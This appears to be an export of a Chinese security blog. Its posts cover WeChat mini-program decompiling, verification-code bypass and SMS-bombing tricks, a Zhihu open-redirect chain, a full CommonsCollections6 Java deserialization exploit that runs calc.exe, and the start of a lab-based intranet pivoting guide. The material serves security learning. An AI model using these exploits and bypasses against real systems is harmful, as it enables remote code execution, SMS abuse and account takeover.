src="/assets/image-20230527155128-6e4cygl.png" alt="image.png"></p><p>加载完成后在如下目录会存在两个md5形式的文件夹</p><blockquote><p>data–&gt;data–&gt;com.tencent.mm–&gt;MicroMsg</p></blockquote><p><img src="/assets/image-20230527145245-mt35jqz.png" alt="image.png"></p><p>其中一个是微信运行固定的md5文件夹，其不用理会</p><p><img src="/assets/image-20230527145318-xtfkspi.png" alt="image.png"></p><p>另外一个就是小程序运行加载过来的包，然后进行如下目录</p><blockquote><p>appbrand–&gt;pkg</p></blockquote><p><img src="/assets/image-20230527155231-mxvtrlt.png" alt="image.png"></p><p>其中里较大的一个数据包是微信小程序内置的sdk，这个包也不用理会，我们只需要把其他三个包复制出来，把这三个文件复制到模拟器的共享文件夹下</p><p><img src="/assets/image-20230527155507-v4g7oyz.png" alt="image.png"></p><p>然后在电脑上复制到WxAppUnpacker目录下</p><p><img src="/assets/image-20230527202520-sy4wlc9.png" alt="image.png"></p><p>一般最大的一个包为主包</p><h1 id="PC提取小程序数据包"><a href="#PC提取小程序数据包" class="headerlink" title="PC提取小程序数据包"></a>PC提取小程序数据包</h1><p>利用手机或模拟器需要把小程序数据包进行来回移动，比较繁琐，我们还可以直接借助PC端微信加载小程序然后把小程序数据包给提取出来。</p><p>首先在PC端登陆微信，在PC端加载小程序</p><p><img src="/assets/image-20230527204402-psmso06.png" alt="image.png"></p><p>然后在微信文件目录下</p><p><img src="/assets/image-20230527204517-d9v7lkh.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\data\WeChat Files\WeChat Files\Applet</span><br></pre></td></tr></table></figure><p>去找到加载到的小程序</p><p><img src="/assets/image-20230527204650-4gcsk28.png" alt="image.png"></p><p>点击进行，可以很清楚的看见谁是主包</p><p><img src="/assets/image-20230527204738-n4oc24y.png" alt="image.png"></p><p>由于PC加载的小程序包有加密，所以我们需要借助如下一款工具进行对数据包进行解密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:<span class="comment">//pan.baidu.com/s/1Vos95RvtcOauqQB12yS8nA?pwd=1ea6 </span></span><br><span class="line">提取码：1ea6 </span><br></pre></td></tr></table></figure><p>直接选择要解密的包就ok</p><p><img src="/assets/image-20230527204831-d9wj3sk.png" alt="image.png"></p><p>然后把每个分包依次解密即可（记得解密分包之前把之前解密的包进行重命名一下，因为该工具所解密后的文件名一致，不重命名会把之前解密的文件覆盖掉）</p><h1 id="小程序反编译"><a href="#小程序反编译" class="headerlink" title="小程序反编译"></a>小程序反编译</h1><p>反编译小程序我们需要使用到WxAppUnpacker这款工具</p><p>用如下命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm wuWxapkg.js 小程序主包所在位置</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230527205824-ehcn4oi.png" alt="image.png"></p><p>然后用如下命令把分别进行反编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node wuWxapkg.js -s=主包反编译后的目录 小程序分包所在位置</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230527210119-4wvnbe5.png" alt="image.png"></p><p>依次利用如上命令把分包依次进行反编译即可</p><p>当然我们还可以利用封装WxAppUnpacker图形化工具直接拖进去反编译，免去敲命令的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:<span class="comment">//pan.baidu.com/s/1Vos95RvtcOauqQB12yS8nA?pwd=1ea6 </span></span><br><span class="line">提取码：1ea6 </span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230527210545-tpdyj0j.png" alt="image.png"></p><p>反编译之后，我们可以利用微信开发者工具或者一些其他的编译器软件对反编译之后所暴露出的路由接口进行测试了</p><p><img src="/assets/image-20230530152940-rghnhne.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞中一些关于验证码的漏洞挖掘总结</title>
      <link href="/2023/05/26/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%85%B3%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%BB%E7%BB%93/"/>
      <url>/2023/05/26/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%85%B3%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="短线轰炸"><a href="#短线轰炸" class="headerlink" title="短线轰炸"></a>短线轰炸</h1><p>通过抓取发送短信的数据包，然后可以把该数据包一直重放达到无限制的去发送短信或者是邮件</p><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>程序员可能会对发送验证码做一定的限制，但是由于考虑不周全还是可以被绕过</p><h3 id="在”phone”字段前后添加字符绕过"><a href="#在”phone”字段前后添加字符绕过" class="headerlink" title="在”phone”字段前后添加字符绕过"></a>在”phone”字段前后添加字符绕过</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">86</span>  <span class="comment">//在前面添加</span></span><br><span class="line">tab</span><br><span class="line">%<span class="number">20</span></span><br><span class="line">+</span><br><span class="line">字母</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230516160505-1affpm0.png" alt="image.png"></p><h3 id="Cookie等身份控制值修改绕过"><a href="#Cookie等身份控制值修改绕过" class="headerlink" title="Cookie等身份控制值修改绕过"></a>Cookie等身份控制值修改绕过</h3><p>系统记录手机号发送验证码的次数极有可能是通过记录cookie或其他记录身份信息的字段请求验证码的次数来统计的，所以我们可以通过删除Cookie等操作判断验证码限制是否可以绕过</p><h3 id="不同验证码接口绕过"><a href="#不同验证码接口绕过" class="headerlink" title="不同验证码接口绕过"></a>不同验证码接口绕过</h3><p>一般触发发送验证码的接口不止一处，程序的后端一般会通过一个type值对不同接口做出区分，我们可以通过修改不同接口达到验证码绕过。</p><p><img src="/assets/image-20230516163005-ua2dq7e.png" alt="image.png"></p><h3 id="大小写绕过邮箱验证"><a href="#大小写绕过邮箱验证" class="headerlink" title="大小写绕过邮箱验证"></a>大小写绕过邮箱验证</h3><p>有时候在发送邮件的时候没有对大小写做限制，我们可以把小写的邮箱替换成大写进行绕过</p><h3 id="X-Forward-For头绕过"><a href="#X-Forward-For头绕过" class="headerlink" title="X-Forward-For头绕过"></a>X-Forward-For头绕过</h3><p>有时程序通过检查X-Forward-For头或其他head头信息来记录验证码发送次数，这个时候修改这些头达到短信爆破</p><p><img src="/assets/image-20230517153633-i0mhg2j.png" alt="image.png"></p><h1 id="手机验证码获取或绕过"><a href="#手机验证码获取或绕过" class="headerlink" title="手机验证码获取或绕过"></a>手机验证码获取或绕过</h1><h2 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="验证码前端回显或返回到相应包中"><a href="#验证码前端回显或返回到相应包中" class="headerlink" title="验证码前端回显或返回到相应包中"></a>验证码前端回显或返回到相应包中</h3><p>程序员设计存在缺陷导致验证码在发送给手机用户的同时在前端或返回包中也出现了</p><p><img src="/assets/image-20230517162745-p8a46mv.png" alt="image.png"></p><h3 id="字段或值重复叠加绕过"><a href="#字段或值重复叠加绕过" class="headerlink" title="字段或值重复叠加绕过"></a>字段或值重复叠加绕过</h3><h4 id="字段叠加"><a href="#字段叠加" class="headerlink" title="字段叠加"></a>字段叠加</h4><p><img src="/assets/image-20230516161545-ahq806c.png" alt="image.png"></p><h4 id="值叠加"><a href="#值叠加" class="headerlink" title="值叠加"></a>值叠加</h4><p><img src="/assets/image-20230516161757-v3w9u8g.png" alt="image.png"></p><p>以上两种双写存在漏洞则两个手机号都会收到验证码</p><h3 id="修改后端返回值绕过"><a href="#修改后端返回值绕过" class="headerlink" title="修改后端返回值绕过"></a>修改后端返回值绕过</h3><p>我们随意输入一个验证码，在验证手机验证码包里面显示验证码错误，有时可以修改返回包状态码来进行绕过</p><p><img src="/assets/image-20230517163821-abzfqg9.png" alt="image.png"></p><p><img src="/assets/image-20230517163450-k005zx7.png" alt="image.png"></p><h3 id="爆破验证码"><a href="#爆破验证码" class="headerlink" title="爆破验证码"></a>爆破验证码</h3><p>有时程序验证码过于简单如只有4位，或验证码有效时间过长，如6位验证码，这种情况我们可以通过暴力破解去获取验证码，进而通过验证。</p><h1 id="登陆框图形验证码等"><a href="#登陆框图形验证码等" class="headerlink" title="登陆框图形验证码等"></a>登陆框图形验证码等</h1><p>在进行登陆或一些其他需要验证码交互的场景下，由于程序员开发失误，导致可以让验证码失效或验证码绕过等</p><h2 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="重放验证码数据包验证码不刷新"><a href="#重放验证码数据包验证码不刷新" class="headerlink" title="重放验证码数据包验证码不刷新"></a>重放验证码数据包验证码不刷新</h3><p>在一些登陆场景下由于程序员设计失误，只要浏览器中的页面不刷新，验证码就不会刷新，这个时候，我们可以通过抓取发送验证码的数据包，发送到burpsuite的暴力破解模块中直接爆破就ok</p><h3 id="删除验证码字段进行绕过"><a href="#删除验证码字段进行绕过" class="headerlink" title="删除验证码字段进行绕过"></a>删除验证码字段进行绕过</h3><p>在一些登陆场景中，最初页面中并未存在验证码，但是错误输入几次账号密码后，需要我们输入验证码进行验证，这个时候，我们可以通过抓包把数据包中对应的验证码字段进行删除进行尝试绕过，如还存在验证码验证可在对Cookie等身份验证等字段删除。</p><h3 id="验证码识别绕过"><a href="#验证码识别绕过" class="headerlink" title="验证码识别绕过"></a>验证码识别绕过</h3><p>一些验证码设计的太简单可以进行识别绕过</p><p>安装bp插件reCAPTCHA或使用pkavhttpfuzzer等</p><p><img src="/assets/image-20230517151119-rt2puj0.png" alt="image.png"></p><h3 id="修改后端返回值绕过-1"><a href="#修改后端返回值绕过-1" class="headerlink" title="修改后端返回值绕过"></a>修改后端返回值绕过</h3><p>此类具体做法和上文讲述的手机验证码修改返回值一致，重新再写一遍，是存在如下一种场景</p><p>在登陆处或修改密码处需要输入用户名和密码，且还一个图形验证码，这时你想爆破密码但是由于存在图形验证码导致你无法爆破，这个时候我们可以通过修改最初登陆处或修改密码处的返回状态码，从而进入到下一个验证接口处，而这个验证接口可能由于开发人员考虑不周全导致此处不存在图形验证码，故可在此处进行暴力破解。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一处知乎正常的业务逻辑</title>
      <link href="/2023/05/17/%E4%B8%80%E5%A4%84%E7%9F%A5%E4%B9%8E%E6%AD%A3%E5%B8%B8%E7%9A%84%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/"/>
      <url>/2023/05/17/%E4%B8%80%E5%A4%84%E7%9F%A5%E4%B9%8E%E6%AD%A3%E5%B8%B8%E7%9A%84%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在总结一些自己学习到或自己遇到的逻辑漏洞案例，发现这个逻辑也是在写URL跳转想着去截图让文章更容易理解一点，所以跑去知乎截了个图，结果有了下面的东西，不是漏洞，只是正常业务逻辑。</p><p><img src="/images/pasted-22.png" alt="upload successful"></p><h1 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h1><p>正常URL跳转应该是这样的</p><p><img src="/images/pasted-24.png" alt="upload successful"></p><p>以前在知乎写文章跳转的链接也都是存在提示的，但是当天写我好巧不巧用了个百度的测试，结果直接跳转百度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://link.zhihu.com/?target=https://www.baidu.com</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-26.png" alt="upload successful"></p><p>可想而知百度在知乎的跳转白名单内，但是百度能跳转到其他网站的方式可太多了，我们能不能利用知乎跳转到百度的跳转地址上呢？以下只展示一种方式</p><h1 id="漏洞？"><a href="#漏洞？" class="headerlink" title="漏洞？"></a>漏洞？</h1><p>首先我利用百度搜索csdn</p><p><img src="/images/pasted-30.png" alt="upload successful"></p><p>复制这个csdn的跳转链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.baidu.com/link?url=L1LdfTWmGl5f1P9nfgItTxjb6pJfiFl-OXHB5qYHdHm&amp;wd=&amp;eqid=8b9794310001febe0000000664635036</span><br></pre></td></tr></table></figure><p>然后让知乎跳转到这个百度链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://link.zhihu.com/?target=https://www.baidu.com/link?url=L1LdfTWmGl5f1P9nfgItTxjb6pJfiFl-OXHB5qYHdHm&amp;wd=&amp;eqid=8b9794310001febe0000000664635036</span><br></pre></td></tr></table></figure><p>发现直接通过知乎跳转到csdn</p><p><img src="/images/pasted-31.png" alt="upload successful"></p><p>利用这种方式进行跳转唯一条件是让百度收录该网站即可，让百度收录一些网站太容易了，且还有很多其他百度能进行跳转的地方且不需要让百度收录。当然这是一个正常的业务逻辑，也没有必要再去耗费时间。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonCollections6反序列化链分析</title>
      <link href="/2023/05/16/CommonCollections6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/05/16/CommonCollections6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>在Java 8u71以后，CC1链就不能在利用了，因为sun.reflect.annotation.AnnotationInvocationHandler这个类里面的readObject方法逻辑已经发生了改变。修改后的逻辑会把我们构造的Map重新put到LinkedHashMap里当中去，我们构造的反序列化链也随之失效。所以我们需要寻找一个新的类去去解决高版本无法利用问题，而CommonCollections6在commons-collections库里一个比较通用的链。</p><h1 id="CC1链回顾"><a href="#CC1链回顾" class="headerlink" title="CC1链回顾"></a>CC1链回顾</h1><p>在之前<a href="../../02/CommonCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/">CC1</a>链利用LazyMap链构链中关键步骤就是触发LazyMap类里面的get方法，我们找到了sun.reflect.annotation.AnnotationInvocationHandler类利用对象代理去触发到了这个方法，现在AnnotationInvocationHandler类的readObject方法里的逻辑发生改变，所以现在需要重新寻找一个类去，那在CC6这条链中，这个类就是java.util.HashSet。</p><h1 id="CC6链分析"><a href="#CC6链分析" class="headerlink" title="CC6链分析"></a>CC6链分析</h1><p>我们看看java.util.HashSet这个类是怎么触发LazyMap类里面的get方法的</p><p><img src="/assets/image-20230510200942-evomp4i.png" alt="image.png"></p><p>可以看到在HashSet类里的readObject方法里面调用了HashMap的put方法，跟进put</p><p><img src="/assets/image-20230510201104-vql6an0.png" alt="image.png"></p><p>调用hash(key)，跟进</p><p><img src="/assets/image-20230510201332-m3dp9rf.png" alt="image.png"></p><p>调用key.hashCode()，且key是我们传进来的一个Object类，代码走到这，我们所要做的就是寻找一个类，这个类里面存在hashCode方法，且这个hashCode方法存在层层调用关系间接的去调用到LazyMap类里的get方法，然后我们把这个类当作key传到这里的hash方法中。这里找到的类就是org.apache.commons.collections.keyvalue.TiedMapEntry，来看看这个类的hashCode方法是怎么调用到LazyMap里的get方法的。</p><p><img src="/assets/image-20230510202622-w7hrw96.png" alt="image.png"></p><p>调用getValue，跟进</p><p><img src="/assets/image-20230510202723-3okqwxd.png" alt="image.png"></p><p>getValue里面调用到了map.get，且这里的map在构造器中可控，所以我们可以把LazyMap.decorate修饰过的Map传进来进而调用它的get方法，至此我们的整个链就可以走通了。</p><p>CC6的大致构造如上，具体POC还存在诸多细节，我们如下再逐行进行分析</p><p>先上POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span></span><br><span class="line">            <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                String.class,</span><br><span class="line">                Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                Object.class,</span><br><span class="line">                Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class</span><br><span class="line">            &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">            <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">            <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是P牛的Java安全漫谈里简化的CC6链，其对ysoserial原链⽤ java.util.HashSet.readObject 到 HashMap.put() 到 HashMap.hash(key)做了简化，原因是在java.util.HashMap.readObject方法里就可以找到HashMap.hash()方法的调用，所以省略了ysoserial链里的前两次调用。</p><p>代码的第16-38行，先创建了一个fakeTransformers，先把fakeTransformers给放到构造链中，这里的目的是为了防止本地生成序列化流的时候执行到命令，所以先创建了一个无害的数组放进去，最后通过反射来把真正有害的数组再加入进去。其他和CC1链一致，具体构造原理参考CC1链</p><p>代码第40行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里把我们构造好的outerMap通过构造器赋值给TiedMapEntry类的map属性</p><p><img src="/assets/image-20230511184948-dur4ogn.png" alt="image.png"></p><p>代码的第42-43行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br></pre></td></tr></table></figure><p>创建了一个HashMap，然后把tme当作key传进去，从而在HashMap的readObject方法里会通过层层调用执行key.hashCode()</p><p><img src="/assets/image-20230511192052-745keyl.png" alt="image.png"></p><p><img src="/assets/image-20230511192237-wtw3s68.png" alt="image.png"></p><p>这里的key是TiedMapEntry，所以调用TiedMapEntry.hashCod，然后调用之前分析的如下链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry.hashCod--&gt;TiedMapEntry.getValue</span><br></pre></td></tr></table></figure><p>再调用</p><p><img src="/assets/image-20230512111553-vtj8fv0.png" alt="image.png"></p><p>这里的map就已经是我们构造的outerMap，之后的调用就是CC1链分析过的了，这里就不再叙述了。</p><p>另外代码的45行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里存在一个缓存机制，当不移除keykey的时候，由于缓存机制的存在，如下的一层if进不去，导致transform不执行</p><p><img src="/assets/image-20230512113429-52w76xu.png" alt="image.png"></p><p>所以我们需要把这个keykey进行移除，进入到这个transform，最终执行命令</p><p><img src="/assets/image-20230512113623-1weayz9.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网代理技术</title>
      <link href="/2023/05/08/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/05/08/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在我们的内网渗透中，我们往往是通过拿下Web服务器的权限，再通过Web服务器做一个跳板来做横向渗透。我们知道在我们拿下的Web的服务器上做一些横向渗透是有点困难的，因为在Web这台机器上没有我们平常渗透常用的一些渗透工具，故横向渗透非常的困难，假如我们可以直接用我们自己的电脑做攻击机就可以让我们在渗透的过程中得心应手。但是我们知道我们想要拿到的服务器在内网之中，我们无法通过互联网去直接访问它，这种时候我们又想控制它，我们就需要借助一些代理技术来辅助我们去完成直接控制内网机器的过程。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里借助一个红日团队开源的一个红队实战测试的部分来完成本次环境搭建，靶机下载地址如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</span><br></pre></td></tr></table></figure><p>对本靶场环境做出一些修改之后，最终环境如下所示</p><p>黑客攻击机：kali、windows10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">网卡IP：192.168.178.128</span><br><span class="line">网卡IP：192.168.178.1</span><br></pre></td></tr></table></figure><p>Web服务器：windows7系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外网网卡IP：192.168.178.133</span><br><span class="line">内网网卡IP：192.168.52.143</span><br></pre></td></tr></table></figure><p>域控服务器：windows server 2008系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网卡IP：192.168.52.138</span><br></pre></td></tr></table></figure><h2 id="网络互通状况"><a href="#网络互通状况" class="headerlink" title="网络互通状况"></a>网络互通状况</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali、windows10可以ping通windows7的外网网卡，ping不通内网网卡</span><br><span class="line">windows7可以ping通kali、windows10和windows server 2008</span><br><span class="line">windows server 2008 ping不通windows7、kali和windows10</span><br></pre></td></tr></table></figure><h1 id="MSF"><a href="#MSF" class="headerlink" 